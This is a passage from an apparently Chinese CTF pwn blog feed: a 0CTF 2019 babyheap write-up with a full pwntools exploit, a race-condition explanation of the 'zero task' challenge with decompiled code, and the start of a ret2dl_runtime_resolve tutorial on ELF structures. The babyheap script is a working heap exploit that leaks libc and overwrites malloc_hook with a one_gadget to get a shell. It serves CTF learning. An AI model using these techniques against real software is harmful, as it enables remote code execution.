class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(des + v3) = 0;          --&gt;   here</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当时只发现了这个漏洞，尝试了一会，当时想可能是需要把tcache填满或者把topchunk的size给消耗完(因为这次的size看上去比较小，有耗光的可能)，但是没有思路在于假如将topchunk size消耗完有什么用。遂放弃。</p><p>今天有wp出来了，出乎意料的，漏洞点确实只有这一个且前面的想法都差不多没有跑偏，但是后面缺少的的思路才是重点。</p><p>前面通过将size耗光，此时再申请时会触发consolidate，同时将之前fastbins中的的chunk归入unsorted bin,这样就有了泄露libc的机会， 通过trigger consolidation 的操作使得unsorted bin刚好覆盖到未free的chunk上，以此来泄露libc，同时也因此拥有了相当于任意地址写的机会。</p><p>同时利用此漏洞将size放入fastbin中，将chunk分配到main_arena处修改topchunk地址到malloc_hook上修改即可</p><p>问题有：</p><ol><li>申请chunk tcache与unsorted bin 的优先度？</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./babyheap&quot;)</span><br><span class="line">#sh = remote(&quot;111.186.63.20&quot;,&quot;10001&quot;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)#(&apos;libc-2.28.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line"></span><br><span class="line">def update(idx,size,con):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Content: &apos;,con)</span><br><span class="line">def delete(idx):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def shrink(size,cnt):</span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            allocate(size)</span><br><span class="line">            update(i,size,&apos;x&apos;*size)</span><br><span class="line"></span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">shrink(0x28,7)</span><br><span class="line">shrink(0x48,7)</span><br><span class="line">shrink(0x28,15)  #--&gt; which will be consolidate to unsorted bin</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">for i in range(7):  # 0-6</span><br><span class="line">    allocate(0x18)</span><br><span class="line">    update(i,0x17,&apos;1&apos;*0x17)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)     #7    # fastbins to unsorted bins and allocate from it;  malloc_consolidate won&apos;t consolidate tcache bins;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(7,0x38,&apos;2&apos;*0x38)  #shrink topchunk to 0x200</span><br><span class="line"></span><br><span class="line">allocate(0x18)     #8</span><br><span class="line">allocate(0x18)     #9</span><br><span class="line">for i in range(10,15): # 10 - 14</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;2&apos;*0x47)</span><br><span class="line">for i in range(1,7):  #1-6</span><br><span class="line">    delete(i)  </span><br><span class="line">delete(9)  #0x18</span><br><span class="line">delete(0)  #0x18</span><br><span class="line">delete(8)  #0x18</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38) #0   # consolidate again            !!!!!!!!! 因为此处之前的unsortedbin被shrink了，所以后面对unsorted bin的操作无法更新chunk 0的pre_size 位，造成在这次consolidate 的时候chunk 0尝试向后合并是根据自己没有更新成功的pre_size来合并的，所以出书先overflapping,从而可以泄露libc信息</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(10)</span><br><span class="line">sh.recvuntil(&apos;: &apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">libc.address = leak_addr- 0x3ebca0</span><br><span class="line">print hex(libc.address)</span><br><span class="line">main_arena = libc.address+ 0x3ebc40</span><br><span class="line">print hex(main_arena)</span><br><span class="line">one_gadget = libc.address+ 0x4f322</span><br><span class="line">print hex(one_gadget)</span><br><span class="line">#------------------------------------------</span><br><span class="line"></span><br><span class="line">for i in range(1,4):  # 1 - 3</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;3&apos;*0x47)</span><br><span class="line"></span><br><span class="line">allocate(0x58) # 4</span><br><span class="line">allocate(0x28) # 5                 // put chunk5&apos;s address  in the fastbins[0x30];</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">delete(5)</span><br><span class="line">allocate(0x58) # 5</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(5,0x48,&apos;\x00&apos;*0x38+p64(0x31)+p64(0x51))  # fake fd to fastbin</span><br><span class="line">allocate(0x28)</span><br><span class="line">update(6,0x20,&apos;\x00&apos;*0x18+p64(0x21))</span><br><span class="line">delete(1)</span><br><span class="line">update(10,0x8,p64(main_arena+0x10))</span><br><span class="line">allocate(0x48)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x48)</span><br><span class="line">update(8,0x48,&apos;\x00&apos;*0x40+p64(main_arena-0x38))  # edit topchunk upon malloc_hook</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x58)</span><br><span class="line">#print hex(libc.symbols[&apos;&apos;])</span><br><span class="line">update(9,0x20,&apos;\x00&apos;*0x10+p64(one_gadget)+p64(libc.symbols[&apos;svc_run&apos;]+0x42))</span><br><span class="line">allocate(0x58)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><em>整个过程特别复杂，尤其是看不到指针的情况下，与2018一样需要慢慢捋，最好在纸上记录chunk地址与idx；</em><br><em>堆的一些地方还是有盲区，理解不够细致</em></p><h1 id="zero-task"><a href="#zero-task" class="headerlink" title="zero task"></a>zero task</h1><p><em>这个是被做出来最多的pwn，条件竞争类型的，之前没有接触过，当时看到跑线程想到可能是这个，但是没去现学，不过还是得继续。</em></p><h2 id="race-condition"><a href="#race-condition" class="headerlink" title="race condition"></a>race condition</h2><p>竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。</p><p>代码说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//myThreadTest</span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;pthread.h&gt;  </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int i = 1;  </span><br><span class="line">void *mythread1()  </span><br><span class="line">&#123;   </span><br><span class="line">    if(i == 1)&#123;</span><br><span class="line">    sleep(3);</span><br><span class="line">    if(i == 2)             </span><br><span class="line">    printf(&quot;hack it!\n&quot;);</span><br><span class="line">    else</span><br><span class="line">    printf(&quot;you can try again!\n&quot;);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">void *mythread2()  </span><br><span class="line">&#123;  </span><br><span class="line">    sleep(1);</span><br><span class="line">    i=2;      </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">int main(int argc, const char *argv[])  </span><br><span class="line">&#123;    </span><br><span class="line">    pthread_t id1,id2;  </span><br><span class="line">  </span><br><span class="line">    pthread_create(&amp;id1, NULL, (void *)mythread1,NULL);  </span><br><span class="line">    pthread_create(&amp;id2, NULL, (void *)mythread2,NULL);  </span><br><span class="line">     </span><br><span class="line">    pthread_join(id1,NULL);  </span><br><span class="line">    pthread_join(id2,NULL);  </span><br><span class="line">  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test  -lpthread        // linux 默认库不包含pthread，所以编译时需要添加lpthread</span><br><span class="line"></span><br><span class="line">$ ./test </span><br><span class="line">hack it!</span><br></pre></td></tr></table></figure><p>这个例子比较简单，但是很清晰，可以说是两个并发流同时访问了对象i ，在线程一还未结束时（sleep(3)），线程三同时访问对象i并修改了i的值从而影响了线程一。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>三个功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1. Add task&quot;);</span><br><span class="line">  puts(&quot;2. Delete task&quot;);</span><br><span class="line">  puts(&quot;3. Go&quot;);</span><br><span class="line">  return printf(&quot;Choice: &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>add 功能： 先输入task id 与 加解密选择，然后malloc(0x70)的空间存放数据；之后进入加解密函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;, 0LL);</span><br><span class="line">idx = get_num();</span><br><span class="line">printf(&quot;Encrypt(1) / Decrypt(2): &quot;);</span><br><span class="line">method = get_num();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">signed __int64 __fastcall enc_dec(int method, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rsi</span><br><span class="line">  task *v4; // [rsp+0h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+14h] [rbp-1Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Key : &quot;, a2);</span><br><span class="line">  get_str2((__int64)v4-&gt;key, 32);</span><br><span class="line">  printf(&quot;IV : &quot;, 32LL);</span><br><span class="line">  get_str2((__int64)&amp;v4-&gt;IV, 16);</span><br><span class="line">  printf(&quot;Data Size : &quot;, 16LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = (unsigned int)get_num();</span><br><span class="line">  if ( (signed int)v5 &lt;= 0 || (signed int)v5 &gt; 0x1000 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)&amp;v4-&gt;size = (signed int)v5;</span><br><span class="line">  *(_QWORD *)&amp;v4[1].key[8] = EVP_CIPHER_CTX_new();</span><br><span class="line"></span><br><span class="line">  if ( method == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_EncryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, (__int64)v4-&gt;key, (__int64)&amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( method != 2 )</span><br><span class="line">      return 0LL;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_DecryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, v4-&gt;key, &amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v4-&gt;method = method;</span><br><span class="line">  v4-&gt;ptr = (__int64)malloc(*(_QWORD *)&amp;v4-&gt;size);                                         </span><br><span class="line">  if ( !v4-&gt;ptr )</span><br><span class="line">    exit(1);</span><br><span class="line">  printf(&quot;Data : &quot;, v3);</span><br><span class="line">  get_str2(v4-&gt;ptr, *(_QWORD *)&amp;v4-&gt;size);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数就是对id还有一点数据检验之后将之前申请的chunk free</p><p>go函数 通过一点检查，之后创建线程将之前的输入的task 跑起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;);</span><br><span class="line"> v1 = get_num();</span><br><span class="line"> for ( arg = (void *)str; arg; arg = (void *)*((_QWORD *)arg + 13) )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( v1 == *((_DWORD *)arg + 0x18) )</span><br><span class="line">   &#123;</span><br><span class="line">     pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, arg);</span><br><span class="line">     return __readfsqword(0x28u) ^ v4;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>重点的start routine函数,开始便sleep(2)，算是比较明显的条件竞争漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn start_routine(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+14h] [rbp-2Ch]</span><br><span class="line">  __int128 v2; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v3; // [rsp+28h] [rbp-18h]</span><br><span class="line">  __int64 v4; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = (unsigned __int64)a1;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  puts(&quot;Prepare...&quot;);</span><br><span class="line">  sleep(2u);</span><br><span class="line">  memset(ptr_0, 0, 0x1010uLL);</span><br><span class="line">  if ( !(unsigned int)EVP_CipherUpdate(</span><br><span class="line">                        *(_QWORD *)(v2 + 88),</span><br><span class="line">                        ptr_0,</span><br><span class="line">                        &amp;v1,</span><br><span class="line">                        *(_QWORD *)v2,</span><br><span class="line">                        (unsigned int)*(_QWORD *)(v2 + 8)) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  if ( !(unsigned int)EVP_CipherFinal_ex(*(_QWORD *)(v2 + 88), (char *)ptr_0 + *((_QWORD *)&amp;v2 + 1), &amp;v1) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  puts(&quot;Ciphertext: &quot;);</span><br><span class="line">  sub_107B(stdout, (__int64)ptr_0, *((unsigned __int64 *)&amp;v2 + 1), 0x10uLL, 1uLL);</span><br><span class="line">  pthread_exit(0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>知道条件竞争漏洞的存在，可以利用其泄露地址；虽然是存在加解密过程，但是因为知道是AES_256_CBC 加密，同时python具有这个加密模块，所以这个可以解决</p><p>同时还需要的是写地址，在申请add task时 ，每个task 会得到四个chunk 第一个和第四个分别是结构体的存储与data的存储；<br>第二三个结构体是加解密申请的结构体，大小分别为0xb0 与 0x110，其中有存放指针，key， 加密后的data；</p><p>通过伪造加解密的结构及利用tcache的特点将chunk分配到malloc_hook并写入one_gadget；</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这次的0ctf真的溃不成军，看了一些题心态爆炸&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;babyheap&quot;&gt;&lt;a href=&quot;#babyheap&quot; class=&quot;headerlink&quot; title=&quot;babyheap&quot;&gt;&lt;/a&gt;babyheap&lt;/h1&gt;&lt;h2 id=&quot;题
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn1.4--ret2dl_runtime_resolve</title>
    <link href="http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/"/>
    <id>http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</id>
    <published>2019-03-19T23:12:54.000Z</published>
    <updated>2019-03-24T05:35:26.413Z</updated>
    
    <content type="html"><![CDATA[<h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。</p><p>如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -d bof</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048358</span><br><span class="line"> 0x0000000d (FINI)                       0x8048624</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048278</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481d8</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048330</span><br><span class="line"> 0x00000011 (REL)                        0x8048318</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482f8</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482e4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><p>节中包含目标文件的所有信息。节的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Word sh_name;      // 节头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;      // 节类型</span><br><span class="line">    Elf32_Word sh_flags;     // 节标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;      // 节的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;    // 节的文件偏移</span><br><span class="line">    Elf32_Word sh_size;      // 节的长度</span><br><span class="line">    Elf32_Word sh_link;      // 节头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;      // 附加信息</span><br><span class="line">    Elf32_Word sh_addralign; // 节对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;   // 固定大小的节表项的长度</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -S bof</span><br><span class="line">There are 31 section headers, starting at offset 0x18a4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4</span><br><span class="line">  